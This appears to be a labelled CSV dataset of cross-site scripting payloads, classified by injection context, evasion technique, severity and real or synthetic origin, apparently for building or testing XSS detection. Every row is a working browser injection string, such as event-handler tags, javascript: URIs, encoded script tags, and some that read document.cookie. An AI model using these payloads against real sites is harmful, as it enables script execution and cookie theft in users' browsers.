payload,context,technique,severity,length,source
"<label onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</label>",event_handler,none,medium,67,real
"<IMG SRC=x onkeydown=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,60,real
"<style>:target {color:red;}</style><canvas id=x style=""transition:color 1s"" ontransitionstart=alert(1)></canvas>",event_handler,none,medium,112,real
"""><svg onbegin=prompt(document.domain)>",tag_injection,synthetic,medium,39,synthetic
"<IMG DYNSRC=""javascript:alert('XSS')"">",js_uri,case_variation,medium,38,real
%3Csvg onmouseover=prompt(document.domain)/%3E,tag_injection,synthetic,medium,46,synthetic
"<em onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</em>",event_handler,none,medium,80,real
"""><svg%20onload=alert%26%230000000040""1"")>",event_handler,url_encoding,low,42,real
"javascript:prompt(String.fromCharCode(88,83,83))",js_uri,synthetic,medium,48,synthetic
<textarea onchange=alert(1)>AnonKryptiQuz</textarea>,event_handler,none,medium,52,real
"<map onclick=""alert(1)"" style=display:block>AnonKryptiQuz</map>",event_handler,none,medium,63,real
"<style>:target {color:red;}</style><link id=x style=""transition:color 1s"" ontransitionstart=alert(1)></link>",event_handler,none,medium,108,real
"<style>@keyframes x{}</style><head style=""animation-name:x"" onwebkitanimationend=""alert(1)""></head>",event_handler,none,medium,99,real
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></acronym>",event_handler,none,medium,107,real
<animate contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,61,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dl>",event_handler,none,medium,174,real
"<strike oncontextmenu=""alert(1)"">AnonKryptiQuz</strike>",event_handler,none,medium,55,real
<video controls ondurationchange=alert(1)><source src=validvideo.mp4 type=video/mp4></video>,event_handler,none,medium,92,real
"<img onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</img>",event_handler,none,medium,66,real
"<style>@keyframes slidein {}</style><picture style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></picture>",event_handler,none,medium,174,real
<p onpointermove=alert(1) style=display:block>AnonKryptiQuz</p>,event_handler,none,medium,63,real
"<nobr onmouseup=""alert(1)"">AnonKryptiQuz</nobr>",event_handler,none,medium,47,real
"window.name=""javascript:alert(23)"";",js_uri,none,medium,35,real
<marguee/onstart=alert(1)>,event_handler,none,medium,26,real
"<form id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></form>",event_handler,none,medium,84,real
"<img src onerror /"" '""= alt=javascript:alert(2211)//"">",js_uri,none,medium,54,real
<tfoot onpointerover=alert(1) style=display:block>AnonKryptiQuz</tfoot>,event_handler,none,medium,71,real
"""><svg onlo&#97;d=consol&#101;.log(1)>",tag_injection,synthetic,medium,38,synthetic
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onwebkitanimationend=""alert(1)""></shadow>",event_handler,none,medium,103,real
' oNbeGin=alErt('XSS') ',attribute_escape,synthetic,medium,24,synthetic
"<style>:target {color:red;}</style><i id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></i>",event_handler,none,medium,106,real
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationend=""alert(1)""></caption>",event_handler,none,medium,99,real
<script>/x/prompt(%27XSS%27)</script>,script_injection,synthetic,medium,37,synthetic
"<iframe draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</iframe>",event_handler,none,medium,68,real
"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable style=display:block>drop here</meta>",event_handler,none,medium,125,real
"<font oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</font>",event_handler,none,medium,71,real
<rt onpointerout=alert(1) style=display:block>AnonKryptiQuz</rt>,event_handler,none,medium,64,real
"<figure onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</figure>",event_handler,none,medium,88,real
"&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\""XSS\"")';&lt;/STYLE&gt;",generic,html_entity,medium,70,real
<svg onb&#101;gin=confirm(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,54,synthetic
"<element draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</element>",event_handler,none,medium,92,real
<details onpointerenter=alert(1) style=display:block>AnonKryptiQuz</details>,event_handler,none,medium,76,real
'x'%20onclick='confirm`AnonKryptiQuz`',event_handler,url_encoding,low,38,real
<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>,event_handler,none,medium,68,real
"<rt onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,63,real
<style onreadystatechange=alert(1)>,event_handler,none,medium,35,real
"<rb oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,95,real
%22 onmouseenter=console.log(1) %22,attribute_escape,synthetic,medium,35,synthetic
"<option draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</option>",event_handler,none,medium,68,real
"<style>:target {transform: rotate(180deg);}</style><blockquote id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blockquote>",event_handler,none,medium,138,real
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=print()></code>",event_handler,none,low,125,real
"<spacer draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",event_handler,none,medium,88,real
"<picture onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",event_handler,none,medium,73,real
""">a<marquee onstart='constructor.constructor(atob(""ywxlcnqoj09qru5cvudct1vovfknkq""))()'></marquee>",event_handler,encoding,low,98,real
""" oNloAd=ConFirM(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,medium,49,synthetic
"<q id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></q>",event_handler,none,medium,78,real
"<map onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</map>",event_handler,none,medium,64,real
%27 onmouseover=alert(document.cookie) %27,attribute_escape,synthetic,medium,42,synthetic
%27 onbegin=alert(%27XSS%27) %27,attribute_escape,synthetic,medium,32,synthetic
<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(7409) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>,js_uri,none,medium,201,real
<img src=x onerror=alert(document.domain)>,event_handler,none,medium,42,real
"<rtc onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</rtc>",event_handler,none,medium,62,real
"eval(""confirm(document.cookie)"")",dom_sink,synthetic,medium,32,synthetic
<style onpointerup=alert(1) style=display:block>AnonKryptiQuz</style>,event_handler,none,medium,69,real
"<video2 oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<svg draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",event_handler,none,medium,84,real
"<element onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</element>",event_handler,none,medium,70,real
<multicol onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</multicol><input value=clickme>,event_handler,none,medium,116,real
"<data draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</data>",event_handler,none,medium,85,real
"<img src\x09=x onerror=""javascript:alert(9260)"">",event_handler,none,medium,48,real
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,event_handler,none,medium,57,real
"<i onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</i>",event_handler,none,medium,63,real
"<details onmousemove=""alert(1)"">AnonKryptiQuz</details>",event_handler,none,medium,55,real
<button popovertarget=x>Click me</button><ruby onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</ruby>,event_handler,none,medium,104,real
%2522%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E,generic,url_encoding,low,140,real
%3Cscript%3E/x/console.log(location.hash)%3C/script%3E,script_injection,synthetic,medium,54,synthetic
"<svg onclick=console.log(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,57,synthetic
"j&#97;vascr	ipt:console.log(String.fromCharCode(88,83,83))",js_uri,synthetic,medium,58,synthetic
"document.write(""<img src=x onerror=\u0061lert('XSS')>"")",dom_sink,synthetic,medium,55,synthetic
<svg onbegin=\u0061lert(1)>,tag_injection,synthetic,medium,27,synthetic
"<style>:target {transform: rotate(180deg);}</style><tbody id=x style=""transition:transform 2s"" ontransitionrun=print()></tbody>",event_handler,none,low,127,real
<div onpointerout=alert(1) style=display:block>AnonKryptiQuz</div>,event_handler,none,medium,66,real
<scr	ipt>alert`document.cookie`</scr	ipt>,script_injection,synthetic,medium,41,synthetic
"<div draggable=""true"" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>",event_handler,none,medium,105,real
"<a href=""jav&#x61script:alert(3)"">a</a>",attribute_escape,html_entity,medium,39,real
<image id=x tabindex=1 onfocus=alert(1)></image>,event_handler,none,medium,48,real
"<samp onmouseenter=""alert(1)"">AnonKryptiQuz</samp>",event_handler,none,medium,50,real
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",attribute_escape,case_variation,medium,62,real
"<rp onmouseleave=""alert(1)"">AnonKryptiQuz</rp>",event_handler,none,medium,46,real
<svG oNtoGglE=cOnfIrm(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,39,synthetic
j&#97;v&#97;script:&#97;l&#101;rt(docum&#101;nt.dom&#97;in),js_uri,synthetic,medium,59,synthetic
"<video oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,73,real
"<a2 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></a2>",event_handler,none,medium,80,real
<multicol onpointerup=alert(1) style=display:block>AnonKryptiQuz</multicol>,event_handler,none,medium,75,real
eval(URL.slice(-8))>#alert(1),dom_sink,encoding,high,29,real
<area id=x tabindex=1 onbeforeactivate=alert(1)></area>,event_handler,none,medium,55,real
<img src='1' onerror\x0d=alert(0) />,tag_injection,none,medium,36,real
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',generic,none,medium,51,real
"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",tag_injection,none,low,63,real
<scRipT>/*/cOnfIrm(doCumEnt.coOkiE)</scRipT>,script_injection,synthetic,medium,44,synthetic
<script>prompt(%27XSS%27)</script>,script_injection,synthetic,medium,34,synthetic
"""><img src=x onerror=prompt(document.domain); title=x>",event_handler,none,medium,54,real
<element onpointermove=alert(1) style=display:block>AnonKryptiQuz</element>,event_handler,none,medium,75,real
<body onmessage=alert(1)>,event_handler,none,medium,25,real
<dt onpointermove=alert(1) style=display:block>AnonKryptiQuz</dt>,event_handler,none,medium,65,real
"<style>@keyframes x{}</style><s style=""animation-name:x"" onwebkitanimationend=""alert(1)""></s>",event_handler,none,medium,93,real
"<div id=""54""><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[""'`-->]]>]</div><div id=""55""><video><source onerror=""alert(55)"">//[""'`-->]]>]</div><div id=""56""><video onerror=""alert(56)""><source></source></video>//[""'`-->]]>]</div><div id=""57""><b <script>alert(57)//</script>0</script></b>//[""'`-->]]>]</div><div id=""58""><b><script<b></b><alert(58)</script </b></b>//[""'`-->]]>]</div><div id=""59""><div id=""div1""><input value=""``onmouseover=alert(59)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>//[""'`-->]]>]</div><div id=""60""><div style=""[a]color[b]:[c]red"">XXX</div>//[""'`-->]]>]</div>",script_injection,none,medium,736,real
"<summary oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
"<div draggable=""true"" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>",event_handler,none,medium,105,real
"<section onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</section>",event_handler,none,medium,89,real
"' ontoggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,72,synthetic
<audio2 onpointermove=alert(1) style=display:block>AnonKryptiQuz</audio2>,event_handler,none,medium,73,real
<embed onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</embed><input value=clickme>,event_handler,none,medium,110,real
"<style>:target {color:red;}</style><noscript id=x style=""transition:color 1s"" ontransitionend=alert(1)></noscript>",event_handler,none,medium,114,real
"<div draggable=""true"" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable style=display:block>drop here</nextid>",event_handler,none,medium,129,real
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=pRomPt(LocAtiOn.HasH)>"")",dom_sink,synthetic,medium,59,synthetic
"<style>:target {color: red;}</style><object id=x style=""transition:color 10s"" ontransitioncancel=print()></object>",event_handler,none,low,114,real
"<style>@keyframes slidein {}</style><slot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></slot>",event_handler,none,medium,162,real
"<col draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</col>",event_handler,none,medium,84,real
<svg onmouseenter=console.log(location.hash)>,tag_injection,synthetic,medium,45,synthetic
secbreake@gmail.com\u003C/script\u003E\u003Cscript\u003Ealert(document.domain)//,dom_sink,unicode_escape,medium,80,real
""" oNfoCus=prOmpT(lOcaTioN.hAsh) """,attribute_escape,synthetic,medium,33,synthetic
<img src=x onerror=alert('from\u0020subcat\u0020title')>,event_handler,unicode_escape,medium,56,real
' oNbeGin=coNfiRm('XSS') ',attribute_escape,synthetic,medium,26,synthetic
"<div draggable=""true"" contenteditable>drag me</div><section ondrop=alert(1) contenteditable style=display:block>drop here</section>",event_handler,none,medium,131,real
"<ins draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</ins>",event_handler,none,medium,84,real
"<svG oNclIck=alErt(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection,synthetic,medium,51,synthetic
%3Csvg onmouseenter=alert(document.cookie)%3E,tag_injection,synthetic,medium,45,synthetic
<img onerror=a&#108;ert(1) src=a>,event_handler,html_entity,low,33,real
<svG oNtoGglE=cOnsOle.loG(1)>,tag_injection,synthetic,medium,29,synthetic
"<a href=""\xE2\x80\x88javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79,real
console.log(document.domain),dom_sink,none,low,28,real
"<tfoot onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</tfoot>",event_handler,none,medium,67,real
"javascript:`/*</title></style></textarea></noscript></script></noembed></template></select/""/'/*--><frame onload=alert()><svg/\""/*<svg onload=' /**/-alert()//'>javascript:/*`/*\""/*'/*</noembed>""/*<frame src=javascript:/**/;alert()//--></title></textarea></style></noscript></template></select></script><<svg/onload= alert()//>",event_handler,comment_injection,medium,326,real
"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",event_handler,html_entity|encoding|comment_injection|url_encoding,high,90,real
"<image onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</image>",event_handler,none,medium,72,real
"<big onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</big>",event_handler,none,medium,63,real
"<big draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</big>",event_handler,none,medium,64,real
<button popovertarget=x>Click me</button><fieldset ontoggle=alert(1) popover id=x>AnonKryptiQuz</fieldset>,event_handler,none,medium,106,real
"<div oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
<abbr onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</abbr><input value=clickme>,event_handler,none,medium,108,real
